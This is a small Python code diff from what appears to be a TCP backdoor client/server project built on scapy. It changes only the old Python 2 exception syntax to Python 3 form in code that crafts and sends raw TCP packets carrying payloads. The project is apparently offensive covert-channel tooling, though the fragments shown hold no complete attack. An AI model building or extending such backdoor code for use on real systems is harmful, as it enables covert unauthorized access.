@@ -197,7 +197,7 @@ class TcpBackdoorServer(BackdoorServer):
                      / TCP(dport=self.dport, sport=self.sport, window=32768, flags=PSH|ACK)\
                      / Raw(load=payload)
             r = sr1(packet)
-        except Exception, err:
+        except Exception as err:
             print(str(err))
             sys.exit(1)
 
@@ -309,7 +309,7 @@ class TcpBackdoorClient(BackdoorClient):
         try:
             connpacket = IP(dst=self.server) / TCP(dport=self.dport, sport=self.sport, window=windowsize, seq=isn, flags=SYN, options=[("MSS", mss)])
             r = sr1(connpacket) # wait for a response so that we know they got the packet
-        except Exception, err:
+        except Exception as err:
             print(str(err))
             sys.exit(1)
 
@@ -321,7 +321,7 @@ class TcpBackdoorClient(BackdoorClient):
 
             self.seq += len(payload)
             send(packet) # TODO: Why doesn't this receive a response if it's sr1 instead of send()?
-        except Exception, err:
+        except Exception as err:
             print(str(err))
             sys.exit(1)
 
